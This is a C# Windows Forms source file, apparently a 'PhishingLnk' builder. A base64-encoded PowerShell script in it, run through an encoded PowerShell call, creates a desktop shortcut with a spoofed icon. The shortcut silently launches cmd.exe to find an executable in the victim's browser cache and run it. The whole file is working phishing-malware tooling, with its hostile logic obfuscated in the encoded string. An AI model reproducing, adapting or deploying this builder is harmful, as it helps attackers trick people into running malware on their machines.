using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace PhishingLnk
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string builder = Encoding.Default.GetString(Convert.FromBase64String("JHNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JGRlc2t0b3AgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnRGVza3RvcCcpOyRzaG9ydGN1dCA9ICRzaGVsbC5DcmVhdGVTaG9ydGN1dCgiJGRlc2t0b3BcJWZpbGVuYW1lJS5sbmsiKTskc2hvcnRjdXQuVGFyZ2V0UGF0aCA9ICJDOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiOyRzaG9ydGN1dC5XaW5kb3dTdHlsZSA9IDc7JHNob3J0Y3V0LkFyZ3VtZW50cyA9ICcgL2MgImNkICVVU0VSUFJPRklMRSVcQXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcV2luZG93c1xJTmV0Q2FjaGUgJiBkaXIgL3MgL0IgJWZpbGVuYW1lJSouZXhlIHwgY21kLmV4ZSAvayIgJzskc2hvcnRjdXQuSWNvbkxvY2F0aW9uID0gIiVsbmslPy5pY28iOyRzaG9ydGN1dC5TYXZlKCk7"));
        
        private void button1_Click(object sender, EventArgs e)
        {
            string lnk = textBox1.Text;
            string filename = textBox2.Text;
            builder = builder.Replace("%lnk%", lnk).Replace("%filename%", filename);
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(builder)); 
            Process.Start("Powershell.exe", "-enc " + b64);
            MessageBox.Show("Done.\nFile saved on your desktop.");
        }
    }
}
